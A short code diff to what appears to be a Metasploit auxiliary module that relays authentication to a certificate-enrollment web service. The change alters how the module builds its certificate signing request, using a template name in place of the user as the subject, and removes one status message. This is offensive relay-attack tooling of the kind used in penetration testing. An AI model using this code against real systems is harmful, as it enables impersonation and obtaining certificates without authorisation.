@@ -95,12 +95,12 @@ class MetasploitModule < Msf::Auxiliary
 
   alias run exploit
 
-  def create_csr(private_key, authenticated_user)
+  def create_csr(private_key, cert_template)
     vprint_status('Generating CSR...')
     request = OpenSSL::X509::Request.new
     request.version = 1
     request.subject = OpenSSL::X509::Name.new([
-      ['CN', authenticated_user, OpenSSL::ASN1::UTF8STRING]
+      ['CN', cert_template, OpenSSL::ASN1::UTF8STRING]
     ])
     request.public_key = private_key.public_key
     request.sign(private_key, OpenSSL::Digest.new('SHA256'))
@@ -206,7 +206,6 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     location_tag = res.body.match(/^.*location="(.*)"/)[1]
-    vprint_status("Certificate location tag = #{location_tag}")
     location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
     vprint_status('Requesting Certificate from Relay Target...')
     req = authenticated_http_client.request_cgi(
